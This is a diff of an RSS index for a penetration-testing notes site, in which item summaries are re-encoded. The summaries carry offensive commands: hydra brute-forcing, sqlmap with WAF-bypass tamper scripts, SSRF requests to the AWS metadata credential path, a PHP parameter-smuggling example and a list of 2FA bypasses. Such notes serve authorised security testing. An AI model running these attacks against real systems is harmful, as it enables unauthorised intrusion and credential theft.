- PHP and Apache use the last username occurence. Tomcat uses the first occurence. ASP and IIS user all occurences  A study containing all the servers can be found here: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf
-Social Media Share Links #  Often a websites offers its user a feature to share a given page in social media.</description>
+PHP and Apache use the last username occurence. Tomcat uses the first occurence. ASP and IIS user all occurences A study containing all the servers can be found here: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf
+Social Media Share Links # Often a websites offers its user a feature to share a given page in social media.</description>
     </item>
     
     <item>
@@ -325,8 +371,8 @@ Social Media Share Links #  Often a websites offers its user a feature to share 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/passwordbruteforce/</guid>
-      <description>Password Bruteforcing #  Hash identify #  # https://github.com/noraj/haiti haiti hash Test for default credentials #  # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra #  Hydra is a command-line tool for online password attacks, such as website login pages and ssh.
-General format for website attacks: #  hydra -L &amp;lt;username list&amp;gt; -p &amp;lt;password list&amp;gt; [host] http-post-form &amp;quot;&amp;lt;path&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;failed login message&amp;gt;&amp;quot; Wordpress #  Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:</description>
+      <description>Password Bruteforcing # Hash identify # # https://github.com/noraj/haiti haiti hash Test for default credentials # # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra # Hydra is a command-line tool for online password attacks, such as website login pages and ssh.
+General format for website attacks: # hydra -L &amp;lt;username list&amp;gt; -p &amp;lt;password list&amp;gt; [host] http-post-form &amp;#34;&amp;lt;path&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;failed login message&amp;gt;&amp;#34; Wordpress # Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:</description>
     </item>
     
     <item>
@@ -335,7 +381,8 @@ General format for website attacks: #  hydra -L &amp;lt;username list&amp;gt; -p
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/prototypepollution/</guid>
-      <description>Prototype Pollution #   https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan  Where to find? #   Javascript driven frameworks (Express..)  PHP #  PHP internally uses parse_str() to parse parameters so it sees the char &amp;ldquo;[&amp;rdquo; &amp;amp; &amp;ldquo;_&amp;rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php</description>
+      <description>Prototype Pollution # https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan Where to find? # Javascript driven frameworks (Express..) PHP # PHP internally uses parse_str() to parse parameters so it sees the char &amp;ldquo;[&amp;rdquo; &amp;amp; &amp;ldquo;_&amp;rdquo; as the same. PHP by default will use the last param as valid. In cases PHP is running on backend but front end validates the param, we can smuggle fake params to php
+example.com?account_id=gust&amp;amp;account[id=admin # Backend would execute guest and frontend admin Talks # https://www.</description>
     </item>
     
     <item>
@@ -344,8 +391,8 @@ General format for website attacks: #  hydra -L &amp;lt;username list&amp;gt; -p
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/requestsmuggling/</guid>
-      <description>Request Smuggling #  It&amp;rsquo;s far more easier to search for articles explaining this concept.
-Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles #   https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/  Exploitation #   Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header.  </description>
+      <description> Request Smuggling # It&amp;rsquo;s far more easier to search for articles explaining this concept.
+Tools # HTTP Request Smuggler, Burp extension # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles # https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling https://paper.seebug.org/1049/ Exploitation # Bring impact by reporting smuggling chained with host injection. Users should make simple request with your injected header. </description>
     </item>
     
     <item>
@@ -354,9 +401,9 @@ Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/s
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/sqli/</guid>
-      <description>SQLi #  sqlmap #   https://github.com/sqlmapproject/sqlmap  # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --data=&amp;quot;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;quot; --method=POST # get sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; # with point of injection (*) sqlmap -u &amp;quot;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;quot; # risk sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --risk=3 --level=5 Temper #  The ability to create payloads that can bypass waf
- https://github.com/m4ll0k/Atlas  Example:
---tamper=&amp;quot;between,randomcase&amp;quot; Articles #     URL     https://www.</description>
+      <description> SQLi # sqlmap # https://github.com/sqlmapproject/sqlmap # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --data=&amp;#34;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;#34; --method=POST # get sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; # with point of injection (*) sqlmap -u &amp;#34;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;#34; # risk sqlmap -u &amp;#34;http://example.com/index.php?id=1&amp;#34; --risk=3 --level=5 Temper # The ability to create payloads that can bypass waf
+https://github.com/m4ll0k/Atlas Example:
+--tamper=&amp;#34;between,randomcase&amp;#34; Articles # URL https://www.binarytides.com/sqlmap-hacking-tutorial/ https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html </description>
     </item>
     
     <item>
@@ -365,7 +412,7 @@ Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/s
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/ssrf/</guid>
-      <description>SSRF #  Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
+      <description>SSRF # Sometimes sites offer the possibility to make external requests using their server, what if we could user their “external” service to make requests for internal resources. That’s SSRF.
 If the site is hosted in amazon, it is possible to get internal information by requesting the urls:
 http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/iam/securty-credentials Another idea is to try and request IP’s that we know that are internal:
 10.0.0.0 to 10.</description>
@@ -377,26 +424,8 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/ssti/</guid>
-      <description>SSTI #  Tools #  # https://github.com/epinna/tplmap tplmap.py -u &#39;http://www.target.com/page?name=John&#39; ASP/APS.NET/ASPX #   % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt;  Tips #  Try to SSTI with the fuzz string provided in cobalt.io blog post refered below
-   URL Description     https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI   https://github.com/payloadbox/ssti-payloads Payloads   https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti Blog about SSTI    </description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/docs/exploitation/twofa/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/docs/exploitation/twofa/</guid>
-      <description>Two factor Authentication #  Bypasses #   Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp  </description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/docs/exploitation/typesofauth/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/docs/exploitation/typesofauth/</guid>
-      <description>Authentication Types #  Basic Auth (B64) #  Authorization: Basic AXVubzpwQDU1dzByYM== Bearer Token (JWT) #  Authorization: Bearer &amp;lt;token&amp;gt; API Key #  GET /endpoint?api_key=abcdefgh123456789 X-API-Key: abcdefgh123456789 Digest Auth #  Authorization: Digest username=&amp;quot;admin&amp;quot; Realm=&amp;quot;abcxyz&amp;quot; nonce=&amp;quot;474754847743646&amp;quot;, uri=&amp;quot;/uri&amp;quot; response=&amp;quot;7cffhfr54685gnnfgerg8&amp;quot; OAuth2.0 #  Authorization: Bearer hY_9.B5f-4.1BfE Hawk Authentication #  Authorization: Hawk id=&amp;quot;abcxyz123&amp;quot;, ts=&amp;quot;1592459563&amp;quot;, nonce=&amp;quot;gWqbkw&amp;quot;, mac=&amp;quot;vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU=&amp;quot; AWS signature #  Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_ </description>
+      <description> SSTI # Tools # # https://github.com/epinna/tplmap tplmap.py -u &amp;#39;http://www.target.com/page?name=John&amp;#39; ASP/APS.NET/ASPX # % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt; Tips # Try to SSTI with the fuzz string provided in cobalt.io blog post refered below
+URL Description https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI https://github.com/payloadbox/ssti-payloads Payloads https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti Blog about SSTI </description>
     </item>
     
     <item>
@@ -405,12 +434,12 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/wafbypass/</guid>
-      <description>WAF Bypass Techniques #    Try to find real IP address instead of TLD domain, see IP history websites section
-  Awesome WAF
-  WAF Community Bypasses
-  Known Bypasses
-  How to bypass wafs
-  # https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites #   https://whoisrequest.</description>
+      <description>WAF Bypass Techniques # Try to find real IP address instead of TLD domain, see IP history websites section
+Awesome WAF
+WAF Community Bypasses
+Known Bypasses
+How to bypass wafs
+# https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites # https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ Quick Techniques # Given domain.com, try to access:</description>
     </item>
     
     <item>
@@ -419,7 +448,7 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/webtech/</guid>
-      <description>Web technologies #  Adobe AEM #   aem-hacker aemscan aem-paths.txt writeup about aem exploitation  API #   API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap  Apache #   Exploit default apache  Artifactory Hacking #   Artifactory Hacking guide  ASP.NET/IIS #   ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner  trace.</description>
+      <description>Web technologies # Adobe AEM # aem-hacker aemscan aem-paths.txt writeup about aem exploitation API # API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache # Exploit default apache Artifactory Hacking # Artifactory Hacking guide ASP.NET/IIS # ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner trace.axd any.aspx/trace.axd WEB-INF/web.xml /con/ /aux/ con.aspx aux.aspx Cloudflare # Techniques to try to uncover web servers behind cloudflare:</description>
     </item>
     
     <item>
@@ -428,10 +457,11 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/xss/</guid>
-      <description>XSS #  # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe Find reflected parameters that could lead to XSS with Gxss
-# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep #  Semgrep can be used to detect sink and sources and assist in XSS detection.
-Usage #  Download javascript files and beautify them (See Javascript), then run semgrep with
-semgrep -c xss.yaml scripts/* Hold down!</description>
+      <description>XSS # # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe Find reflected parameters that could lead to XSS with Gxss
+# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep # Semgrep can be used to detect sink and sources and assist in XSS detection.
+Usage # Download javascript files and beautify them (See Javascript), then run semgrep with
+semgrep -c xss.yaml scripts/* Hold down!
+Javascript files must be beautified, otherwise semgrep will no work properly.</description>
     </item>
     
     <item>
@@ -440,8 +470,8 @@ semgrep -c xss.yaml scripts/* Hold down!</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/xxe/</guid>
-      <description>XXE #  Detection:
-# Content type &amp;quot;application/json&amp;quot; or &amp;quot;application/x-www-form-urlencoded&amp;quot; to &amp;quot;applcation/xml&amp;quot;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:</description>
+      <description>XXE # Detection:
+# Content type &amp;#34;application/json&amp;#34; or &amp;#34;application/x-www-form-urlencoded&amp;#34; to &amp;#34;applcation/xml&amp;#34;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:</description>
     </item>
     
     <item>
@@ -468,9 +498,9 @@ semgrep -c xss.yaml scripts/* Hold down!</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/asncidr/</guid>
-      <description>ASN #  An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.
+      <description>ASN # An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.
 The five regional Internet registries are:
-African Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC)  Obtaining an ASN (autonomous system number) #  By Organization Name #   https://asrank.</description>
+African Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC) Obtaining an ASN (autonomous system number) # By Organization Name # https://asrank.</description>
     </item>
     
     <item>
@@ -479,7 +509,7 @@ African Network Information Center (AFRINIC) American Registry for Internet Numb
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/dorks/</guid>
-      <description>Dorks #  Google #  # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks Github #  #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks Useful sites #   https://dorks.faisalahmed.me/ (Appends URL to google dorks) https://vsec7.</description>
+      <description> Dorks # Google # # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks Github # #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks Useful sites # https://dorks.faisalahmed.me/ (Appends URL to google dorks) https://vsec7.github.io/ (Appends URL to github dorks) </description>
     </item>
     
     <item>
@@ -488,11 +518,11 @@ African Network Information Center (AFRINIC) American Registry for Internet Numb
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/fuzzing/</guid>
-      <description>Fuzzing #  Rate Limited?
+      <description>Fuzzing # Rate Limited?
 Try to run techniques from 403 Bypass
- Configure your options! ffuf runs by default with ffuf custom user agent, some sites will not trust that and return dummy data. The solution for this is to implement a .ffufrc file with real headers:
+Configure your options! ffuf runs by default with ffuf custom user agent, some sites will not trust that and return dummy data. The solution for this is to implement a .ffufrc file with real headers:
 https://gist.github.com/felipecaon/d1e7c980d7bab1312ea81df1d0241f42
- # https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;quot;https://example.com/PAYLOAD&amp;quot; -H &amp;quot;HEADER:127.</description>
+# https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;#34;https://example.com/PAYLOAD&amp;#34; -H &amp;#34;HEADER:127.0.0.1&amp;#34; -X &amp;#34;METHOD&amp;#34; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w allipstoffuf:URL -w ~/.</description>
     </item>
     
     <item>
@@ -501,8 +531,8 @@ https://gist.github.com/felipecaon/d1e7c980d7bab1312ea81df1d0241f42
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/paramdiscovery/</guid>
-      <description>Parameter Discovery #  There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.
-X8 #  # https://github.com/Sh1Yo/x8 x8 -u &amp;quot;https://example.com/&amp;quot; -w &amp;lt;wordlist&amp;gt; Arjun #  # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w &amp;lt;wordlist&amp;gt; Param discovering from crawling results #  Given a list with crawled urls, grep the ones that have known parameters and get only the url</description>
+      <description>Parameter Discovery # There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.
+X8 # # https://github.com/Sh1Yo/x8 x8 -u &amp;#34;https://example.com/&amp;#34; -w &amp;lt;wordlist&amp;gt; Arjun # # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w &amp;lt;wordlist&amp;gt; Param discovering from crawling results # Given a list with crawled urls, grep the ones that have known parameters and get only the url</description>
     </item>
     
     <item>
@@ -511,7 +541,7 @@ X8 #  # https://github.com/Sh1Yo/x8 x8 -u &amp;quot;https://example.com/&amp;quo
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/portscan/</guid>
-      <description>Port Scan #  Nmap #  # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com  https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/  Naabu #  # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com naabu -list hosts.txt cat lists | naabu -silent echo example.com | naabu -nmap-cli &#39;nmap -sC -sV -oX nmap-output&#39; </description>
+      <description> Port Scan # Nmap # # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/ Naabu # # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com naabu -list hosts.txt cat lists | naabu -silent echo example.com | naabu -nmap-cli &amp;#39;nmap -sC -sV -oX nmap-output&amp;#39; </description>
     </item>
     
     <item>
@@ -520,9 +550,9 @@ X8 #  # https://github.com/Sh1Yo/x8 x8 -u &amp;quot;https://example.com/&amp;quo
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/probing/</guid>
-      <description>Probing #  Validates a list of urls, checks to see if they are alive or not.
+      <description> Probing # Validates a list of urls, checks to see if they are alive or not.
 Two tools were provided, choose the best fit, they do the same thing.
-Httprobe #  # https://github.com/tomnomnom/httprobe/ # go get -u github.com/tomnomnom/httprobe@master cat urls | httprobe --prefer-https | tee -a out HttpX #  # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out </description>
+Httprobe # # https://github.com/tomnomnom/httprobe/ # go get -u github.com/tomnomnom/httprobe@master cat urls | httprobe --prefer-https | tee -a out HttpX # # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out </description>
     </item>
     
     <item>
@@ -531,9 +561,10 @@ Httprobe #  # https://github.com/tomnomnom/httprobe/ # go get -u github.com/tomn
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/scope/</guid>
-      <description>Scope #  An scope can be defined as the limits of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
+      <description>Scope # An scope can be defined as the limits of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
 Example of scope
-   In-Scope Out of scope     example.com subdomain.example.com   *-dev.example.com     The scope above states that example.com and www.example.com are valid (www is a subdomain, example.</description>
+In-Scope Out of scope example.com subdomain.example.com *-dev.example.com The scope above states that example.com and www.example.com are valid (www is a subdomain, example.com points to www by default).
+Any subdomain under -dev.example.com is valid as well, the wildcard symbol (*) states that anything is valid.</description>
     </item>
     
     <item>
@@ -542,10 +573,10 @@ Example of scope
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/screenshot/</guid>
-      <description>Screenshot #  For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.
+      <description>Screenshot # For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.
 Hold down!
 A browser must be installed prior using an screenshotter. Chrome or chromium is recommended.
- EyeWitness #  # https://github.com/FortyNorthSecurity/EyeWitness EyeWitness -f urls.txt --web GoWitness #  # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t &amp;lt;threads&amp;gt; --disable-logging webscreenshot.py
+EyeWitness # # https://github.com/FortyNorthSecurity/EyeWitness EyeWitness -f urls.txt --web GoWitness # # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t &amp;lt;threads&amp;gt; --disable-logging webscreenshot.py
 webscreenshot is Kopfschmerzen</description>
     </item>
     
@@ -555,8 +586,8 @@ webscreenshot is Kopfschmerzen</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/spider/</guid>
-      <description>Spider #  Crawling #  Use gospider or hakrawler. Personally, I found out hakrawler yields better results
-# https://github.com/jaeles-project/gospider gospider -S subdomains.txt --js -t 20 -d 5 --sitemap --robots -r &amp;gt; spider.txt cat spider.txt | grep -o -E &amp;quot;(([a-zA-Z][a-zA-Z0-9+-.]*\:\/\/)|mailto|data\:)([a-zA-Z0-9\.\&amp;amp;\/\?\:@\+-\_=#%;,])*&amp;quot; | grep &amp;quot;example.com&amp;quot; &amp;gt;&amp;gt; links.txt # hakrawler cat hosts | hakrawler -t 20 Check if hosts/paths are valid #  # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.</description>
+      <description>Spider # Crawling # Use gospider or hakrawler. Personally, I found out hakrawler yields better results
+# https://github.com/jaeles-project/gospider gospider -S subdomains.txt --js -t 20 -d 5 --sitemap --robots -r &amp;gt; spider.txt cat spider.txt | grep -o -E &amp;#34;(([a-zA-Z][a-zA-Z0-9+-.]*\:\/\/)|mailto|data\:)([a-zA-Z0-9\.\&amp;amp;\/\?\:@\+-\_=#%;,])*&amp;#34; | grep &amp;#34;example.com&amp;#34; &amp;gt;&amp;gt; links.txt # hakrawler cat hosts | hakrawler -t 20 Check if hosts/paths are valid # # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.</description>
     </item>
     
     <item>
@@ -565,7 +596,7 @@ webscreenshot is Kopfschmerzen</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/subdomainenum/subdomainenum/</guid>
-      <description>Subdomain Enumeration #  The art of subdomain enumeration consists into gathering a list of valid subdomains of your target, this list allows a researcher to expand attack surface and understand more about the target.</description>
+      <description>Subdomain Enumeration # The art of subdomain enumeration consists into gathering a list of valid subdomains of your target, this list allows a researcher to expand attack surface and understand more about the target.</description>
     </item>
     
     <item>
@@ -574,9 +605,9 @@ webscreenshot is Kopfschmerzen</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/subdomainenum/subdomainenum_active/</guid>
-      <description>Active Resources #  The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.
+      <description> Active Resources # The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.
 Get resolvers at:
-# https://github.com/felipecaon/resolvers wget https://raw.githubusercontent.com/felipecaon/resolvers/main/resolvers.txt Pure DNS #  # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations #  # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
+# https://github.com/felipecaon/resolvers wget https://raw.githubusercontent.com/felipecaon/resolvers/main/resolvers.txt Pure DNS # # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations # # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
     </item>
     
     <item>
@@ -585,8 +616,8 @@ Get resolvers at:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/subdomainenum/subdomainenum_passive/</guid>
-      <description>Passive Resources #  A passive resource means that you will grab subdomains that were already discovered from another tools or were registered in some place.
-# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script #  amass enum -passive -d domain.</description>
+      <description>Passive Resources # A passive resource means that you will grab subdomains that were already discovered from another tools or were registered in some place.
+# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script # amass enum -passive -d domain.</description>
     </item>
     
     <item>
@@ -595,7 +626,7 @@ Get resolvers at:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/wafcheck/</guid>
-      <description>WAF Check #  Wafw00f #  # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
+      <description> WAF Check # Wafw00f # # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
     </item>
     
     <item>
@@ -604,8 +635,8 @@ Get resolvers at:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/wordlistgeneration/</guid>
